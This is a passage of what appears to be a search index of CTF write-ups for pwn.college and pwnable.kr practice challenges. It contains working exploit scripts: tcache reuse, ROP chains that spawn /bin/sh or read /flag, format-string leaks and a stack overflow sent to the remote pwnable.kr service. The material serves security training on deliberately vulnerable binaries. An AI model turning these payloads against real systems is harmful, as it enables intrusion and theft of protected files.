Goodbye!\n</code></pre>"},{"location":"pwn.college/Program%20Security/Dynamic%20Allocator%20Misuse/#level-11","title":"level 1.1","text":"<p>Now we don't have the helpful descriptive output</p> <p>In GDB:</p> <ul> <li><code>b *main+604</code> (Set a breakpoint at malloc() call when read_flag entered)</li> <li><code>run</code> -&gt; Enter \"read_flag\" -&gt; breakpoint encountered</li> <li><code>i r</code> -&gt; rax has value 990</li> </ul> <p>Replace 741 by 990 in prev solution</p>"},{"location":"pwn.college/Program%20Security/Dynamic%20Allocator%20Misuse/#level-20","title":"level 2.0","text":"<pre><code>[*] Function (malloc/free/puts/read_flag/quit): read_flag\n\n[*] flag_buffer = malloc(977)\n[*] flag_buffer = 0x5e323065a2c0\n[*] read the flag!\n</code></pre> <p>So, we need to malloc 977 bytes</p> <pre><code>[*] Function (malloc/free/puts/read_flag/quit): malloc\n\nSize: 977\n\n[*] allocations[0] = malloc(977)\n[*] allocations[0] = 0x5e323065a6a0\n\n[*] Function (malloc/free/puts/read_flag/quit): free\n\n[*] free(allocations[0])\n+====================+========================+==============+============================+============================+\n| TCACHE BIN #60     | SIZE: 969 - 984        | COUNT: 1     | HEAD: 0x5e323065a6a0       | KEY: 0x5e323065a010        |\n+====================+========================+==============+============================+============================+\n| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |\n+---------------------+---------------------+------------------------------+---------------------+---------------------+\n| 0x5e323065a6a0      | 0                   | 0x3e1 (P)                    | (nil)               | 0x5e323065a010      |\n+----------------------------------------------------------------------------------------------------------------------+\n\n\n[*] Function (malloc/free/puts/read_flag/quit): read_flag\n\n[*] flag_buffer = malloc(977)\n[*] flag_buffer = 0x5e323065a6a0\n[*] read the flag!\n\n[*] Function (malloc/free/puts/read_flag/quit): puts\n\n[*] puts(allocations[0])\nData: pwn.college{xxxxxxxx}\n</code></pre>"},{"location":"pwn.college/Program%20Security/Dynamic%20Allocator%20Misuse/#level-21","title":"level 2.1","text":"<pre><code>[*] Function (malloc/free/puts/read_flag/quit): read_flag\n\n[*] flag_buffer = 0x62fdc51042a0\n\n[*] Function (malloc/free/puts/read_flag/quit): read_flag\n\n[*] flag_buffer = 0x62fdc51045c0\n</code></pre> <p>Difference is 800 bytes</p> <pre><code>[*] Function (malloc/free/puts/read_flag/quit): malloc\n\nSize: 800\n\n[*] allocations[0] = 0x62fdc51048e0\n\n[*] Function (malloc/free/puts/read_flag/quit): malloc\n\nSize: 800\n\n[*] allocations[0] = 0x62fdc5104c10\n</code></pre> <p>Now, difference is 816 bytes, so read_flag must be malloc-ing 800-16 = 784 bytes</p> <pre><code>[*] Function (malloc/free/puts/read_flag/quit): malloc\n\nSize: 784\n\n[*] allocations[0] = 0x62fdc5104f40\n\n[*] Function (malloc/free/puts/read_flag/quit): free\n\n\n[*] Function (malloc/free/puts/read_flag/quit): read_flag\n\n[*] flag_buffer = 0x62fdc5104f40\n\n[*] Function (malloc/free/puts/read_flag/quit): puts\n\nData: pwn.college{xxxxxx}\n</code></pre>"},{"location":"pwn.college/Program%20Security/Dynamic%20Allocator%20Misuse/#level-30","title":"level 3.0","text":"<p>An extension to level 1.0</p> <pre><code>In this challenge, the flag buffer is allocated 2 times before it is used.\n\n\n[*] Function (malloc/free/puts/read_flag/quit): read_flag\n\n[*] flag_buffer = malloc(773)\n[*] flag_buffer = 0x604f5a44b2c0\n[*] flag_buffer = malloc(773)\n[*] flag_buffer = 0x604f5a44b5d0\n[*] read the flag!\n\n[*] Function (malloc/free/puts/read_flag/quit): malloc\n\nIndex: 0\n\nSize: 773\n\n[*] allocations[0] = malloc(773)\n[*] allocations[0] = 0x604f5a44b8e0\n\n[*] Function (malloc/free/puts/read_flag/quit): malloc\n\nIndex: 1\n\nSize: 773\n\n[*] allocations[1] = malloc(773)\n[*] allocations[1] = 0x604f5a44bbf0\n\n[*] Function (malloc/free/puts/read_flag/quit): free\n\nIndex: 0\n\n[*] free(allocations[0])\n+====================+========================+==============+============================+============================+\n| TCACHE BIN #47     | SIZE: 761 - 776        | COUNT: 1     | HEAD: 0x604f5a44b8e0       | KEY: 0x604f5a44b010        |\n+====================+========================+==============+============================+============================+\n| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |\n+---------------------+---------------------+------------------------------+---------------------+---------------------+\n| 0x604f5a44b8e0      | 0                   | 0x311 (P)                    | (nil)               | 0x604f5a44b010      |\n+----------------------------------------------------------------------------------------------------------------------+\n\n\n[*] Function (malloc/free/puts/read_flag/quit): free\n\nIndex: 1\n\n[*] free(allocations[1])\n+====================+========================+==============+============================+============================+\n| TCACHE BIN #47     | SIZE: 761 - 776        | COUNT: 2     | HEAD: 0x604f5a44bbf0       | KEY: 0x604f5a44b010        |\n+====================+========================+==============+============================+============================+\n| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |\n+---------------------+---------------------+------------------------------+---------------------+---------------------+\n| 0x604f5a44bbf0      | 0                   | 0x311 (P)                    | 0x604f5a44b8e0      | 0x604f5a44b010      |\n| 0x604f5a44b8e0      | 0                   | 0x311 (P)                    | (nil)               | 0x604f5a44b010      |\n+----------------------------------------------------------------------------------------------------------------------+\n\n\n[*] Function (malloc/free/puts/read_flag/quit): read_flag\n\n[*] flag_buffer = malloc(773)\n[*] flag_buffer = 0x604f5a44bbf0\n[*] flag_buffer = malloc(773)\n[*] flag_buffer = 0x604f5a44b8e0\n[*] read the flag!\n\n[*] Function (malloc/free/puts/read_flag/quit): puts\n\nIndex: 0\n\n[*] puts(allocations[0])\nData: pwn.college{xxxxxxx}\n</code></pre>"},{"location":"pwn.college/Program%20Security/Dynamic%20Allocator%20Misuse/#level-31","title":"level 3.1","text":"<p>An extension to level 1.1</p> <p>Now we don't have the helpful descriptive output</p> <p>In GDB:</p> <ul> <li><code>b *main+949</code> (Set a breakpoint at malloc() call when read_flag entered)</li> <li><code>run</code> -&gt; Enter \"read_flag\" -&gt; breakpoint encountered</li> <li><code>i r</code> -&gt; rax has value 545</li> </ul> <pre><code>[*] Function (malloc/free/puts/read_flag/quit): malloc\n\nIndex: 0\n\nSize: 545\n\n\n[*] Function (malloc/free/puts/read_flag/quit): malloc\n\nIndex: 1\n\nSize: 545\n\n\n[*] Function (malloc/free/puts/read_flag/quit): free\n\nIndex: 0\n\n\n[*] Function (malloc/free/puts/read_flag/quit): free\n\nIndex: 1\n\n\n[*] Function (malloc/free/puts/read_flag/quit): read_flag\n\n\n[*] Function (malloc/free/puts/read_flag/quit): puts\n\nIndex: 0\n\nData: pwn.college{xxxxx}\n</code></pre>"},{"location":"pwn.college/Program%20Security/Return%20Oriented%20Programming/","title":"Return Oriented Programming","text":""},{"location":"pwn.college/Program%20Security/Return%20Oriented%20Programming/#level-10","title":"level 1.0","text":"<p>Straightforward; offset and address are given in debug output</p> <pre><code>python3 -c 'import sys; sys.stdout.buffer.write(b\"a\"*56 + b\"\\xe0\\x1d\\x40\")' | /challenge/babyrop_level1.0\n</code></pre>"},{"location":"pwn.college/Program%20Security/Return%20Oriented%20Programming/#level-11","title":"level 1.1","text":"<p>GDB -&gt; <code>disas challenge</code> -&gt; <code>0x0000000000401e48 &lt;+29&gt;:    lea    rax,[rbp-0x70]</code> -&gt; buffer starts at rbp-0x70 and return address stored at rbp+8</p> <pre><code>python3 -c 'import sys; sys.stdout.buffer.write(b\"a\"*0x78 + b\"\\x2e\\x1d\\x40\")' | /challenge/babyrop_level1.1\n</code></pre>"},{"location":"pwn.college/Program%20Security/Return%20Oriented%20Programming/#level-20","title":"level 2.0","text":"<p>offset given in debug output; GDB -&gt; <code>info functions</code> -&gt;</p> <ul> <li><code>win_stage_1()</code> at 0x402108</li> <li><code>win_stage_2()</code> at 0x4021b5</li> </ul> <pre><code>python3 -c 'import sys; sys.stdout.buffer.write(b\"a\"*0x78 + b\"\\x08\\x21\\x40\"+b\"\\x00\"*5+b\"\\xb5\\x21\\x40\")' | /challenge/babyrop_level2.0\n</code></pre>"},{"location":"pwn.college/Program%20Security/Return%20Oriented%20Programming/#level-21","title":"level 2.1","text":"<p>GDB -&gt;</p> <ul> <li>buffer starts at rbp-0x50</li> <li><code>win_stage_1()</code> at 0x4012c4</li> <li><code>win_stage_2()</code> at 0x401371</li> </ul> <pre><code>python3 -c 'import sys; sys.stdout.buffer.write(b\"a\"*0x58 + b\"\\xc4\\x12\\x40\"+b\"\\x00\"*5+b\"\\x71\\x13\\x40\")' | /challenge/babyrop_level2.1\n</code></pre>"},{"location":"pwn.college/Program%20Security/Return%20Oriented%20Programming/#level-30","title":"level 3.0","text":"<p>offset given in debug output \\ Get addresses of functions and <code>pop rdi; ret</code> gadget:</p> <pre><code>objdump -t /challenge/babyrop_level3.0 | grep ' F '\nROPgadget --binary /challenge/babyrop_level3.0 | grep \"pop rdi ; ret\"`\n</code></pre> <pre><code>from pwn import *\nimport sys\n\noffset = 104\nwin_stages = [0x40203f,0x401f5f,0x4022e4,0x4021fe,0x40211b]\ngadget = 0x4026d3\n\npayload = b\"a\"*offset\nfor i in range(5):\n    payload += p64(gadget)\n    payload += p64(i+1)\n    payload += p64(win_stages[i])\n\nsys.stdout.buffer.write(payload)\n</code></pre> <pre><code>python run.py | /challenge/babyrop_level3.0 \n</code></pre>"},{"location":"pwn.college/Program%20Security/Return%20Oriented%20Programming/#level-31","title":"level 3.1","text":"<ul> <li>GDB -&gt; find offset and function addresses</li> <li>ROPgadget -&gt; find gadget address</li> </ul> <p>Now, proceed same as prev</p>"},{"location":"pwn.college/Program%20Security/Return%20Oriented%20Programming/#level-40","title":"level 4.0","text":"<ul> <li>Got starting address of buffer from the stack leak output</li> <li><code>checksec /challenge/babyrop_level4.0</code> -&gt; NX is enabled (stack is non-executable), so shellcode injection won't work</li> <li>GDB -&gt; find offset</li> <li>ROPgadget -&gt; find gadgets to construct ROP chain</li> </ul>"},{"location":"pwn.college/Program%20Security/Return%20Oriented%20Programming/#spawning-a-shell","title":"Spawning a shell","text":"<pre><code>from pwn import *\n\np = process('/challenge/babyrop_level4.0')\np.recvuntil(b'[LEAK]')\naddr = int(str(p.recvline().split(b\" \")[-1])[2:-4], 16)\n\noffset = 0x38\npop_rdi = 0x401e07 # pop rdi; ret\npop_rsi = 0x401e17 # pop rsi; ret\npop_rdx = 0x401de8 # pop rdx; ret\npop_rax = 0x401df7 # pop rax; ret\nsyscall = 0x401ddf\nbinsh = addr + offset + 72\n\npayload = b'A'*offset\npayload += p64(pop_rdi) + p64(binsh) # 1st arg: address of \"/bin/sh\"\npayload += p64(pop_rsi) + p64(0) # 2nd arg: NULL\npayload += p64(pop_rdx) + p64(0) # 3rd arg: NULL\npayload += p64(pop_rax) + p64(59) # syscall number for execve\npayload += p64(syscall) # execve(\"/bin/sh\", NULL, NULL)\npayload += b\"/bin/sh\\x00\"\n\np.sendline(payload)\np.interactive()\n</code></pre> <p>Shell was spawned successfully, but <code>cat /flag</code> gave Permission denied error</p>"},{"location":"pwn.college/Program%20Security/Return%20Oriented%20Programming/#executing-open-read-write-worked","title":"Executing open(), read(), write() worked","text":"<pre><code>from pwn import *\n\np = process('/challenge/babyrop_level4.0')\np.recvuntil(b'[LEAK]')\naddr = int(str(p.recvline().split(b\" \")[-1])[2:-4], 16)\n\noffset = 0x38\npop_rdi = 0x401e07 # pop rdi; ret\npop_rsi = 0x401e17 # pop rsi; ret\npop_rdx = 0x401de8 # pop rdx; ret\npop_rax = 0x401df7 # pop rax; ret\nsyscall = 0x401ddf # syscall\n\nflag_path = addr + offset + 8*25\nbuffer = flag_path + 10\nsize = 100\n\npayload = b'A'*offset\n\npayload += p64(pop_rdi) + p64(flag_path)  # 1st arg: pointer to \"/flag\"\npayload += p64(pop_rsi) + p64(0)  # 2nd arg: O_RDONLY\npayload += p64(pop_rax) + p64(2)  # 3rd arg: syscall number for open\npayload += p64(syscall)  # open(\"/flag\", O_RDONLY)\n\npayload += p64(pop_rdi) + p64(3)  # 1st arg: file descriptor returned by open (stdout is 1, fd is 3 here)\npayload += p64(pop_rsi) + p64(buffer)  # 2nd arg: buffer to store content of \"/flag\"\npayload += p64(pop_rdx) + p64(size)  # 3rd arg: number of bytes to read\npayload += p64(pop_rax) + p64(0)  # syscall number for read\npayload += p64(syscall)  # read(3, buffer, size)\n\npayload += p64(pop_rdi) + p64(1)  # 1st arg: file descriptor for stdout\npayload += p64(pop_rsi) + p64(buffer)  # 2nd arg: buffer having content of \"/flag\"\npayload += p64(pop_rdx) + p64(size)  # 3rd arg: size to write\npayload += p64(pop_rax) + p64(1)  # syscall number for write\npayload += p64(syscall)  # write(1, buffer, size)\n\npayload += b\"/flag\\x00\"\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"pwn.college/Program%20Security/Return%20Oriented%20Programming/#level-41","title":"level 4.1","text":"<p>Prev solution works</p>"},{"location":"pwn.college/Program%20Security/Return%20Oriented%20Programming/#level-50","title":"level 5.0","text":"<p>Here, we don't get a stack leak; so try to find a helpful string in the binary itself:</p> <pre><code>strings -t x /challenge/babyrop_level5.0\n</code></pre> <p>No luck there. But.. we can insert a string in the .bss section!</p> <ul> <li><code>objdump -s -j .bss /challenge/babyrop_level5.0</code> -&gt; get address of .bss section</li> <li>ROPgadget -&gt; get addresses of gadgets</li> <li>GDB -&gt; get offset</li> </ul> <pre><code>from pwn import *\n\np = process('/challenge/babyrop_level5.0')\n\noffset = 0x48\npop_rdi = 0x401dc8 # pop rdi; ret\npop_rsi = 0x401dd0 # pop rsi; ret\npop_rdx = 0x401dc0 # pop rdx; ret\npop_rax = 0x401da0 # pop rax; ret\nsyscall = 0x401db0\nbssaddr = 0x405090\n\nflag_path = b'/flag\\x00'\nbuffer = bssaddr + len(flag_path) + 1\nsize = 75\n\npayload = b'A'*offset\n\n# read(0, bssaddr, len(flag_path))\npayload += p64(pop_rdi) + p64(0)\npayload += p64(pop_rsi) + p64(bssaddr)\npayload += p64(pop_rdx) + p64(len(flag_path))\npayload += p64(pop_rax) + p64(0)\npayload += p64(syscall)\n\n# open(\"/flag\", O_RDONLY)\npayload += p64(pop_rdi) + p64(bssaddr)\npayload += p64(pop_rsi) + p64(0)\npayload += p64(pop_rax) + p64(2)\npayload += p64(syscall)\n\n# read(3, buffer, size)\npayload += p64(pop_rdi) + p64(3)\npayload += p64(pop_rsi) + p64(buffer)\npayload += p64(pop_rdx) + p64(size)\npayload += p64(pop_rax) + p64(0)\npayload += p64(syscall)  \n\n# write(1, buffer, size)\npayload += p64(pop_rdi) + p64(1)\npayload += p64(pop_rsi) + p64(buffer)\npayload += p64(pop_rdx) + p64(size)\npayload += p64(pop_rax) + p64(1)\npayload += p64(syscall)\n\np.sendline(payload)\np.sendline(flag_path)\np.interactive()\n</code></pre>"},{"location":"pwn.college/Program%20Security/Return%20Oriented%20Programming/#level-51","title":"level 5.1","text":"<p>Prev solution works</p>"},{"location":"pwn.college/Program%20Security/Return%20Oriented%20Programming/#level-60","title":"level 6.0","text":"<p>Now, we don't have a <code>syscall</code> gadget</p> <ul> <li><code>checksec /challenge/babyrop_level6.0</code> -&gt; RELRO: Partial -&gt; PLT exists</li> <li><code>objdump -d /challenge/babyrop_level6.0 | grep \"@plt\"</code> -&gt; get addresses of PLT functions</li> <li><code>objdump -s -j .bss /challenge/babyrop_level6.0</code> -&gt; get address of .bss section</li> <li><code>ROPgadget --binary /challenge/babyrop_level6.0</code> -&gt; get addresses of gadgets</li> <li>GDB -&gt; get offset</li> </ul> <pre><code>from pwn import *\n\np = process('/challenge/babyrop_level6.0')\n\noffset = 0x68\npop_rdi = 0x401b98  # pop rdi; ret\npop_rsi = 0x401b90  # pop rsi; ret\npop_rdx = 0x401ba0  # pop rdx; ret\npop_rcx = 0x401b88  # pop rcx; ret\nread_plt = 0x401160\nopen_plt = 0x4011d0\nsendfile_plt = 0x4011a0\nbssaddr = 0x4040a0\n\nflag_path = b'/flag\\x00'\nsize = 64 \n\npayload = b'A' * offset\n\n# read(stdin, bssaddr, len(flag_path))\npayload += p64(pop_rdi) + p64(0)\npayload += p64(pop_rsi) + p64(bssaddr)\npayload += p64(pop_rdx) + p64(len(flag_path))\npayload += p64(read_plt)\n\n# open(\"/flag\", O_RDONLY)\npayload += p64(pop_rdi) + p64(bssaddr)\npayload += p64(pop_rsi) + p64(0)\npayload += p64(open_plt)\n\n# sendfile(stdout, fd, 0, size)\npayload += p64(pop_rdi) + p64(1)           \npayload += p64(pop_rsi) + p64(3)           \npayload += p64(pop_rdx) + p64(0)           \npayload += p64(pop_rcx) + p64(size)        \npayload += p64(sendfile_plt)               \n\np.sendline(payload)\np.sendline(flag_path)\np.interactive()\n</code></pre>"},{"location":"pwn.college/Program%20Security/Return%20Oriented%20Programming/#level-61","title":"level 6.1","text":"<p>Prev solution works</p>"},{"location":"pwn.college/Program%20Security/Return%20Oriented%20Programming/#summary","title":"Summary","text":"<ol> <li>Control Hijack to a function</li> <li>Chaining functions</li> <li>Chaining functions with arguments</li> <li>Chaining ROP gadgets to make syscalls; known buffer address</li> <li>4 but buffer address not known; using .bss section</li> <li>5 but syscall gadget not present; using PLT functions</li> </ol>"},{"location":"pwn.college/Pwntools/Pwntools%20Tutorial/","title":"Pwntools Tutorial","text":""},{"location":"pwn.college/Pwntools/Pwntools%20Tutorial/#level-10","title":"level 1.0","text":"<pre><code>int bypass_me(char *buf)\n{\n    unsigned int magic = 0xdeadbeef;\n\n    if (!strncmp(buf, (char *)&amp;magic, 4)) {\n        return 1;\n    }\n\n    return 0;\n}\n</code></pre> <pre><code>from pwn import *\n\ncontext(arch=\"amd64\", os=\"linux\", log_level=\"info\")\n\nchallenge_path = \"/challenge/pwntools-tutorials-level1.0\"\np = process(challenge_path)\n\npayload = p64(0xdeadbeef)+b\"\\n\"\np.sendafter(b\":)\\n###\\n\", payload)\n\nflag = p.recvline()\nprint(f\"flag is: {flag}\")\n</code></pre>"},{"location":"pwn.college/Pwntools/Pwntools%20Tutorial/#level-11","title":"level 1.1","text":"<pre><code>int bypass_me(char *buf)\n{\n    int flag = 1;\n    int num;\n\n    if (buf[0] != 'p' || buf[1] != 0x15) {\n        flag = 0;\n        goto out; \n    }\n\n    memcpy(&amp;num, buf + 2, 4);\n    if (num != 123456789) {\n        flag = 0;\n        goto out;\n    }\n\n    if (strncmp(buf + 6, \"Bypass Me:)\", 11)) {\n        flag = 0;\n        goto out;\n    }\n\nout:\n    return flag;\n}\n</code></pre> <pre><code>from pwn import *\n\ncontext(arch=\"amd64\", os=\"linux\", log_level=\"info\")\n\nchallenge_path = \"/challenge/pwntools-tutorials-level1.1\"\np = process(challenge_path)\n\npayload = b\"p\"\npayload += p8(0x15)\npayload += p32(123456789)\npayload += b\"Bypass Me:)\"\npayload += b\"\\n\"\np.sendafter(b\":)\\n###\\n\", payload)\n\nflag = p.recvline()\nprint(f\"flag is: {flag}\")\n</code></pre>"},{"location":"pwn.college/Pwntools/Pwntools%20Tutorial/#level-20","title":"level 2.0","text":"<pre><code>while True:\n    print(p.recvline())\n</code></pre> <pre><code>from pwn import *\n\ndef print_lines(io):\n    info(\"Printing io received lines\")\n    while True:\n        try:\n            line = io.recvline()\n            success(line)\n        except EOFError:\n            break\n\ncontext(arch=\"amd64\", os=\"linux\", log_level=\"info\")\n\nchallenge_path = \"/challenge/pwntools-tutorials-level2.0\"\np = process(challenge_path)\n\npayload = asm(\"mov rax, 0x12345678\")\n\np.sendafter(b'Please give me your assembly in bytes \\x1b[1m(\\x1b[0mup to \\x1b[1;36m0x1000\\x1b[0m bytes\\x1b[1m)\\x1b[0m: \\n', payload)\nprint_lines(p)\n</code></pre>"},{"location":"pwn.college/Pwntools/Pwntools%20Tutorial/#level-21","title":"level 2.1","text":"<pre><code>In this level you need to craft assembly code to satisfy the following \nconditions:\n* exchange the value of rax and rbx\n</code></pre> <pre><code>payload = asm(\"xchg rax, rbx\")\n</code></pre>"},{"location":"pwn.college/Pwntools/Pwntools%20Tutorial/#level-22","title":"level 2.2","text":"<pre><code>In this level you need to craft assembly code to complete the following \noperations:\n* rax = rax % rbx + rcx - rsi\n\nWe already set the following in preparation for your code:\nrdx = 0\n</code></pre> <pre><code>payload = asm(\"div rbx\") # computes (rdx:rax) / rbx \u2192 quotient in rax, remainder in rdx\npayload += asm(\"mov rax, rdx\") # rax = rax % rbx\npayload += asm(\"add rax, rcx\") # rax = rax % rbx + rcx\npayload += asm(\"sub rax, rsi\") # rax = rax % rbx + rcx - rsi\n</code></pre>"},{"location":"pwn.college/Pwntools/Pwntools%20Tutorial/#level-23","title":"level 2.3","text":"<pre><code>In this level you need to craft assembly code to complete the following \noperations:\n* copy 8-bytes memory starting at 0x404000 to 8-bytes memory starting at \n0x405000\n</code></pre> <pre><code>payload = asm(\"\"\"\n    mov rax, [0x404000]\n    mov [0x405000], rax\n\"\"\")\n</code></pre>"},{"location":"pwn.college/Pwntools/Pwntools%20Tutorial/#level-24","title":"level 2.4","text":"<pre><code>In this level you need to craft assembly code to complete the following \noperations:\n* the top value of the stack = the top value of the stack - rbx\n\nTips: perfer push and pop instructions, other than directly  dereference\n</code></pre> <pre><code>payload = asm(\"\"\"\n    pop rax\n    sub rax, rbx\n    push rax\n\"\"\")\n</code></pre>"},{"location":"pwn.college/Pwntools/Pwntools%20Tutorial/#level-25","title":"level 2.5","text":"<pre><code>In this level you need to craft assembly code to complete the following \noperations:\n* the top value of the stack = abs(the top value of the stack)\n</code></pre> <pre><code>payload = asm(\"\"\"\n    pop rax\n    test rax, rax\n    jns done\n    neg rax\ndone:\n    push rax\n\"\"\")\n</code></pre>"},{"location":"pwn.college/Pwntools/Pwntools%20Tutorial/#level-26","title":"level 2.6","text":"<pre><code>In this level you need to craft for statement to complete the following \noperations:\n* rax = the sum from 1 to rcx\n</code></pre> <pre><code>payload = asm(\"\"\"\n    xor rax, rax\n    mov rbx, 1\nloop_start:\n    cmp rbx, rcx\n    jg loop_end\n    add rax, rbx\n    inc rbx\n    jmp loop_start\nloop_end:\n\"\"\")\n</code></pre>"},{"location":"pwn.college/Software%20Exploitation/Format%20Strings%20Exploit/","title":"Format Strings Exploit","text":""},{"location":"pwn.college/Software%20Exploitation/Format%20Strings%20Exploit/#level10-level11","title":"level1.0 &amp; level1.1","text":"<p><code>%p</code> prints 8 bytes</p> <pre><code>from pwn import *\np = process('/challenge/babyfmt_level1.0')\n\np.recvuntil(b'Send your data!')\npayload = b'%p'*16\np.sendline(payload)\np.recvuntil(b'I will now call printf on your data!\\n\\n')\n\nl = str(p.recvline())[2:-3].replace('(nil)','').split('0x')\nfor x in l:\n    try:\n        print(bytes.fromhex(x).decode('utf-8')[::-1],end=\"\")\n    except:\n        pass\n\np.interactive()\n</code></pre>"},{"location":"pwn.college/Software%20Exploitation/Format%20Strings%20Exploit/#level20","title":"level2.0","text":"<ul> <li>We know the address where the secret is stored, let it be <code>addr</code></li> <li>Give a string of space-separated <code>%p</code> as input, like in level1: \"%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p\"</li> <li>In output, note at which position <code>addr</code> is printed, say 7th parameter</li> <li>Run the program again, and now give the input <code>%7$s</code></li> </ul>"},{"location":"pwn.college/Software%20Exploitation/Format%20Strings%20Exploit/#level21","title":"level2.1","text":"<ul> <li>Here, we don't knoow the address of the secret</li> <li>Replace all <code>%p</code> with <code>%s</code> where the printed output looks like a memory address</li> </ul> <pre><code>in:  %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p\nout: 0x7881a8a0f723 (nil) 0x7881a8930297 0xa 0x25 0xfffffffffffffff8 0x7fffef602e70 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil)\n\nin:  %s %p %s %p %p %p %s\nout:  (nil) H= 0xa 0x25 0xfffffffffffffff8 IXWEYCSPCCAUMXQ\n</code></pre>"},{"location":"pwn.college/Software%20Exploitation/Format%20Strings%20Exploit/#level31","title":"level3.1","text":"<ul> <li>Given: bss address = 0x404140</li> <li> <p>Try looping over <code>%i$x</code>:</p> <p>```python for i in range(1, 100):     p = process('/challenge/babyfmt_level3.0')     p.recvuntil(b'Send your data!')</p> <pre><code>payload = f'%{i}$x \\x40\\x41\\x40'.encode()\n\np.sendline(payload)\np.recvuntil(b'I will now call printf on your data!\\n\\n')\nop = p.recvuntil(b'Goodbye!')\nif b\"40\" in op or b\"41\" in op:\n    print(op, \"index:\",i)\np.close()\n</code></pre> <p>```</p> <p>But, no Luck here - Try looping over <code>%i$lx</code></p> <p>```text payload = f'%{i}$lx \\x40\\x41\\x40'.encode()</p> <p>b'a40414020786c24 @A@\\n\\n### Goodbye!' index: 23 ```</p> <p>getting closer..</p> <p>```text payload = f'%{23}$lx \\x40\\x41\\x40'.encode()</p> <p>b'a40414020786c24 @A@\\n\\n### Goodbye!'</p> <p>payload = f'%{23}$lx \\x40\\x41\\x40\\x00'.encode()</p> <p>b'40414020786c24 @A@\\n### Goodbye!'</p> <p>payload = f'%{24}$lx AAAA\\x40\\x41\\x40\\x00'.encode()</p> <p>b'a00404140 AAAA@A@\\n### Goodbye!'</p> <p>payload = f'%{24}$lx AAAA\\x40\\x41\\x40\\x00\\x00\\x00\\x00\\x00'.encode()</p> <p>b'404140 AAAA@A@\\n### Goodbye!'</p> <p>payload = f'%{24}$x AAAAA\\x40\\x41\\x40\\x00\\x00\\x00\\x00\\x00'.encode()</p> <p>b'404140 AAAAA@A@\\n### Goodbye!'</p> <p>payload = f'%{24}$s AAAAA\\x40\\x41\\x40\\x00\\x00\\x00\\x00\\x00'.encode()</p> <p>b'pwn.college{xxxxxxxxxxxxxxxxxxxxxxxx}\\n AAAAA@A@\\n### Goodbye!' ```</p> </li> </ul>"},{"location":"pwnable.kr/Toddler%27s%20Bottle/bof/","title":"bof","text":"<ol> <li> <p>Download the files:</p> <p><code>bash wget http://pwnable.kr/bin/bof wget http://pwnable.kr/bin/bof.c</code></p> </li> <li> <p><code>cat bof.c</code> : observing the source code tells us that the program accepts a string input, using which we have to overflow the buffer to alter the value of key <code>0xdeadbeef</code>.</p> </li> <li> <p>Using GDB:</p> <p><code>bash gdb ./bof</code></p> <p>Breakpoint at main and disassemble func():</p> <p>```gdb Reading symbols from ./bof... (No debugging symbols found in ./bof) (gdb) break main  Breakpoint 1 at 0x68d (gdb) r Starting program: /home/harshit/Downloads/bof  [Thread debugging using libthread_db enabled] Using host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".</p> <p>Breakpoint 1, 0x5655568d in main () (gdb) disas func Dump of assembler code for function func: 0x5655562c &lt;+0&gt;:    push   %ebp 0x5655562d &lt;+1&gt;:    mov    %esp,%ebp 0x5655562f &lt;+3&gt;:    sub    $0x48,%esp 0x56555632 &lt;+6&gt;:    mov    %gs:0x14,%eax 0x56555638 &lt;+12&gt;:   mov    %eax,-0xc(%ebp) 0x5655563b &lt;+15&gt;:   xor    %eax,%eax 0x5655563d &lt;+17&gt;:   movl   $0x5655578c,(%esp) 0x56555644 &lt;+24&gt;:   call   0xf7de9140  0x56555649 &lt;+29&gt;:   lea    -0x2c(%ebp),%eax 0x5655564c &lt;+32&gt;:   mov    %eax,(%esp) 0x5655564f &lt;+35&gt;:   call   0xf7de8660  0x56555654 &lt;+40&gt;:   cmpl   $0xcafebabe,0x8(%ebp) 0x5655565b &lt;+47&gt;:   jne    0x5655566b  0x5655565d &lt;+49&gt;:   movl   $0x5655579b,(%esp) 0x56555664 &lt;+56&gt;:   call   0xf7dc1430  0x56555669 &lt;+61&gt;:   jmp    0x56555677  . . . . ``` <li> <p>We see <code>cmpl</code> instruction, comparing the key with <code>0xcafebabe</code> at addr <code>0x56555654</code>. Break there and observe the stack memory:</p> <p>```gdb (gdb) break *0x56555654 Breakpoint 2 at 0x56555654 (gdb) c Continuing. overflow me :  aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</p> <p>Breakpoint 2, 0x56555654 in func () (gdb) x/100x $sp 0xffffcf60: 0xffffcf7c  0xffffd21b  0x00000002  0x0000001c 0xffffcf70: 0xf7ffcfe8  0x00000018  0x00000000  0x61616161 0xffffcf80: 0x61616161  0x61616161  0x61616161  0x61616161 0xffffcf90: 0x61616161  0x61616161  0x61616161  0x61616161 0xffffcfa0: 0x61616161  0xf7d80061  0xffffcfc8  0x5655569f 0xffffcfb0: 0xdeadbeef  0x00000000  0x00000000  0x00000000 0xffffcfc0: 0x00000000  0x00000000  0x00000000  0xf7d95cb9 0xffffcfd0: 0x00000001  0xffffd084  0xffffd08c  0xffffcff0 0xffffcfe0: 0xf7fa1e34  0x5655568a  0x00000001  0xffffd084 0xffffcff0: 0xf7fa1e34  0x565556b0  0xf7ffcb60  0x00000000</p> <p>```</p> <p>Wee see <code>0xdeadbeef</code> at <code>0xffffcfb0</code> and start of our input at the last column of <code>0xffffcf70</code>. So we have to overflow <code>(1+3*4)*4 = 52</code> bytes before writing <code>0xcafebabe</code></p> </li> <li> <p>Using pwntools:</p> <p>```python from pwn import *</p> <p>payload = b'a' * 52 + b'\\xbe\\xba\\xfe\\xca' shell = remote('pwnable.kr',9000) shell.send(payload) shell.interactive() ```</p> <p>This spawns a shell (see <code>system(\"/bin/sh\")</code> in <code>bof.c</code>)</p> <p><code>shell [+] Opening connection to pwnable.kr on port 9000: Done [*] Switching to interactive mode $ ls $ ls bof bof.c flag log super.pl $ cat flag</code></p> </li>"},{"location":"pwnable.kr/Toddler%27s%20Bottle/collision/","title":"collision","text":"<ol> <li> <p><code>ls -la</code> and <code>file</code> commands tell us there are three files:</p> </li> <li> <p>An executable <code>col</code></p> </li> <li>A C file: <code>col.c</code></li> <li>An inaccessible file: <code>flag</code></li> <li><code>cat 